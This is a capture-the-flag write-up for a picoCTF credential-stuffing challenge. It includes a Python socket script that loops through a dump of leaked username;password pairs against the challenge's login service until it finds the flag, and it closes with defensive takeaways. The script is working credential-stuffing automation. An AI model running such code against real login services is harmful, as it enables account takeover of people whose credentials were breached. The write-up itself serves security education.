# PicoCTF – Credential Stuffing
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Points:** 100  
**Author:** David Gaviria  
**Flag:** (obtained via netcat login)

---

## Description

> Credential stuffing is the automated injection of stolen username and password pairs into website login forms, in order to fraudulently gain access to user accounts. A recent data breach at a famous department store leaked thousands of credentials. Stuff those credentials and get the flag!

---

## Analysis

- 1500 credentials in `creds-dump.txt`, format: `username;password`
- Service runs over raw TCP via `nc crystal-peak.picoctf.net 52435`
- Interactive prompt: asks for Username then Password

Since it's raw TCP (not HTTP), `requests` won't work — need Python `socket` library.

---

## Exploitation

### Script

```python
import socket

def recv_until(s, prompt):
    data = b""
    while prompt not in data:
        data += s.recv(1024)
    return data

with open("creds-dump.txt", "r") as f:
    for line in f:
        username, password = line.strip().split(";")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("crystal-peak.picoctf.net", 52435))

        recv_until(s, b"Username:")
        s.send(username.encode() + b"\n")

        recv_until(s, b"Password:")
        s.send(password.encode() + b"\n")

        response = s.recv(1024).decode()
        if "flag" in response.lower() or "picoCTF" in response:
            print(f"FOUND! {username}:{password}")
            print(response)
            break

        s.close()
```

### Key Details

- A **fresh socket connection** is opened per attempt — the service closes connection on failed login
- `recv_until()` waits for the exact prompt before sending — prevents race conditions
- Loop breaks immediately on flag found

---

## Key Takeaways

- **Credential stuffing** exploits password reuse across services — one breach enables access to many sites
- Raw TCP services require `socket` not `requests`
- Always open a fresh connection per attempt for stateless protocols
- Defense: unique passwords per service + a password manager; MFA; breach monitoring
